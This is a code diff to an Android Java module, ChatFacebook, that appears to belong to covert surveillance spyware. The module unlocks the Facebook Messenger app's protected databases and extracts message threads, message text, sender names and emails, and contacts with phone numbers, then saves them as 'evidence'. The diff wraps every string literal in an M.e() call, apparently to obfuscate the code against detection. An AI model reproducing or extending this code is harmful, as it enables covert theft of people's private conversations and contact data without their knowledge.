@@ -123,7 +123,7 @@ public class ChatFacebook extends SubModuleChat {
 		String selection = null;
 
 		RecordHashPairVisitor visitor = new RecordHashPairVisitor("key", "value");
-		helper.traverseRecords("preferences", visitor);
+		helper.traverseRecords(M.e("preferences"), visitor);
 
 		Hashtable<String, String> preferences = visitor.getMap();
 
@@ -166,10 +166,10 @@ public class ChatFacebook extends SubModuleChat {
 			Path.unprotectAll(dbDir, true);
 
 			if (ModuleAddressBook.getInstance() != null) {
-				if (Path.unprotect(dbDir, "users_db2", true)) {
+				if (Path.unprotect(dbDir, M.e("users_db2"), true)) {
 					readAddressUser(dbDir);
 
-				} else if (Path.unprotect(dbDir, "contacts_db2", true)) {
+				} else if (Path.unprotect(dbDir, M.e("contacts_db2"), true)) {
 					readAddressContacts(dbDir);
 				}
 			} else {
@@ -187,7 +187,7 @@ public class ChatFacebook extends SubModuleChat {
 			}
 			if (helper != null) {
 				try {
-					readFB(helper, "thread_id");
+					readFB(helper, M.e("thread_id"));
 					return;
 				} catch (Exception ex) {
 					if (Cfg.DEBUG) {
@@ -241,10 +241,10 @@ public class ChatFacebook extends SubModuleChat {
 	private long fetchMessages(String id_field, GenericSqliteHelper helper, final FbConversation conv, long lastConvId) {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-		String[] projection = new String[] { "text", "sender", "timestamp_ms" };
+		String[] projection = new String[] { M.e("text"), M.e("sender"), M.e("timestamp_ms") };
 		String selection = String.format(id_field + M.e(" = '%s' and text != '' and timestamp_ms > %s"), conv.id,
 				lastConvId);
-		String order = "timestamp_ms";
+		String order = M.e("timestamp_ms");
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
 			@Override
@@ -256,8 +256,8 @@ public class ChatFacebook extends SubModuleChat {
 					String sender = cursor.getString(1);
 
 					JSONObject root = (JSONObject) new JSONTokener(sender).nextValue();
-					String peer = root.getString("email").split("@")[0];
-					String name = root.getString("name");
+					String peer = root.getString(M.e("email")).split("@")[0];
+					String name = root.getString(M.e("name"));
 
 					// localtime or gmt? should be converted to gmt
 					timestamp = cursor.getLong(2);
@@ -300,7 +300,7 @@ public class ChatFacebook extends SubModuleChat {
 			}
 		};
 
-		long newLastId = helper.traverseRecords("messages", visitor);
+		long newLastId = helper.traverseRecords(M.e("messages"), visitor);
 
 		if (messages != null && messages.size() > 0) {
 			saveEvidence(messages);
@@ -344,8 +344,8 @@ public class ChatFacebook extends SubModuleChat {
 		final List<FbConversation> conversations = new ArrayList<FbConversation>();
 
 		// "thread_id"
-		String[] projection = new String[] { id_field, "participants", "timestamp_ms" };
-		String selection = "timestamp_ms > 0 ";
+		String[] projection = new String[] { id_field, M.e("participants"), M.e("timestamp_ms") };
+		String selection = M.e("timestamp_ms > 0 ");
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
@@ -375,7 +375,7 @@ public class ChatFacebook extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRecords("threads", visitor);
+		helper.traverseRecords(M.e("threads"), visitor);
 		return conversations;
 	}
 
@@ -387,8 +387,7 @@ public class ChatFacebook extends SubModuleChat {
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 		// SQLiteDatabase db = helper.getReadableDatabase();
 
-		String[] projection = new String[] { "fbid", "first_name", "last_name", "name", "email_addresses",
-				"phone_numbers" };
+		String[] projection = StringUtils.split( M.e("fbid,first_name,last_name,name,email_addresses,phone_numbers") );
 		String selection = null;
 
 		RecordHashtableIdVisitor visitor = new RecordHashtableIdVisitor(projection);
@@ -450,12 +449,12 @@ public class ChatFacebook extends SubModuleChat {
 				Check.log(TAG + " (json2Contacts) root: " + root);
 			}
 
-			String email = root.getString("email");
+			String email = root.getString(M.e("email"));
 			String fbId = email.split("@")[0];
 
-			String fullName = root.getString("name");
+			String fullName = root.getString(M.e("name"));
 
-			Contact contact = new Contact(fbId, "", fullName, "Id: " + fbId);
+			Contact contact = new Contact(fbId, "", fullName, M.e("Id: ") + fbId);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (json2Contacts) " + contact);
 			}
